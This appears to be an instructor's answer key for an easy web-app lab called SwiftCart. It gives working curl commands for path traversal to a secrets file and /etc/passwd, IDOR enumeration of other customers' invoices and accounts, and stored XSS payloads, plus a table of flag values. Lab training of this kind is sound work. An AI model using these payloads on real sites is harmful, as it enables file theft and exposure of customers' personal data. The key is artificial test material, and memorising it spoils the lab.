# Solution — 04 SwiftCart (easy, webapp set)

> Spoilers — instructor's answer key.

## Surface

`GET /` is the catalogue. `GET /product/:id` renders a product and its stored reviews.
`POST /api/reviews` stores a review. `GET /api/invoices/:id` and `GET /account?id=<n>` return
order/account records. `GET /download?file=<name>` serves receipts from the app's
`downloads/` directory. `GET /health` is the healthcheck. The whole store is in-memory and
seeded at startup; there is no database host.

## Intended findings (three independent vectors)

1. **Path traversal → file exfiltration (vector D).** `GET /download?file=` joins the
   parameter onto the downloads directory with no normalisation or containment check, so
   `../` escapes it:
   ```sh
   curl -s 'http://127.0.0.1:8504/download?file=receipt-1002.txt'          # intended use
   curl -s --path-as-is 'http://127.0.0.1:8504/download?file=../secrets/app.env'
   curl -s --path-as-is 'http://127.0.0.1:8504/download?file=../../../../etc/passwd'
   ```
   `../secrets/app.env` dumps a baked-in secrets file holding a **live payment-gateway API
   key** (`SWIFTCART_API_KEY=sk_live_swiftcart_9f8e7d6c5b4a3210`), a session secret and SMTP
   creds. `../../../../etc/passwd` proves arbitrary-file read.

2. **IDOR → customer PII (vector G, two surfaces).** Neither record endpoint checks auth or
   ownership, so walking the id exposes other customers:
   ```sh
   curl -s http://127.0.0.1:8504/api/invoices/2     # Amara Okonkwo's invoice, card last-4 4417
   curl -s 'http://127.0.0.1:8504/account?id=2'     # her name, email, phone, address
   curl -s 'http://127.0.0.1:8504/account?id=3'     # Priya Raman, and so on
   ```
   The UI only ever links `id=1` ("your" account / invoice); ids `2` and `3` belong to other
   customers. This is the reportable PII exposure (names, billing emails, phones, card
   last-4, shipping addresses).

3. **Stored XSS in reviews (vector H).** `POST /api/reviews` stores a comment verbatim and
   `GET /product/:id` interpolates each review body **raw** (unescaped) into the page. The lab
   ships a seeded review on product 1 whose body is a live payload, so the stored-unsanitised
   finding is verifiable with a single GET — no exploitation required:
   ```sh
   curl -s http://127.0.0.1:8504/product/1 | grep -F '<script>alert(document.domain)</script>'
   ```
   To prove the write side, store your own and read it back:
   ```sh
   curl -s http://127.0.0.1:8504/api/reviews -H 'content-type: application/json' \
     -d '{"productId":2,"author":"pentester","body":"<img src=x onerror=alert(1)>"}'
   curl -s http://127.0.0.1:8504/product/2     # payload comes back raw
   ```

## Planted loot (manifest oracles)

| id | what | where |
|----|------|-------|
| `stored-xss-review` | `<script>alert(document.domain)</script>` | `GET /product/1` |
| `idor-invoice` | `a.okonkwo@brightwater-logistics.example` | `GET /api/invoices/2` |
| `leaked-api-key` | `sk_live_swiftcart_9f8e7d6c5b4a3210` | `/app/secrets/app.env` (via `/download?file=../secrets/app.env`) |

Seeded customers: `Jordan Lee` (id 1, "you"), `Amara Okonkwo` (id 2),
`Priya Raman` (id 3). Seeded reviews: a benign one and the XSS payload, both on product 1.

## Reset

`make lab-restore LAB=04-easy-node` (recreate — the store is re-seeded on process start, so a
fresh container is pristine; any reviews you POST'd are gone).
